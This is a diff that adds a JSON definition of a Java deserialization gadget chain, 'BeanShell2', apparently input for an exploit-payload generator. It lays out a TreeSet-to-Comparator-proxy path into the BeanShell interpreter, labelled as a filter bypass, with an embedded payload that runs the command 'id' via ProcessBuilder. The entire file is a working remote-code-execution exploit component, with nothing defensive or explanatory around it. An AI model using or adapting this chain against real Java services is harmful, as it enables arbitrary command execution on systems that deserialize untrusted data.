@@ -1,0 +1,21 @@
+{
+    "chain_type": "BeanShell2 — TreeSet + BeanShell Interpreter via Comparator proxy (filter-bypass)",
+    "root_class": "java.util.TreeSet",
+    "root_trigger": "readObject→TreeMap.put→Comparator.compare→XThis$Handler.invoke→Interpreter.eval",
+    "links": [
+        {
+            "class": "bsh.XThis$Handler",
+            "field_overrides": {
+                "target": {"$ref": "link:1"},
+                "action": "compare"
+            }
+        },
+        {
+            "class": "bsh.Interpreter",
+            "field_overrides": {
+                "payload": "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"id\"}).start();return new Integer(1);}"
+            }
+        }
+    ],
+    "sink_method": "ProcessBuilder.start"
+}
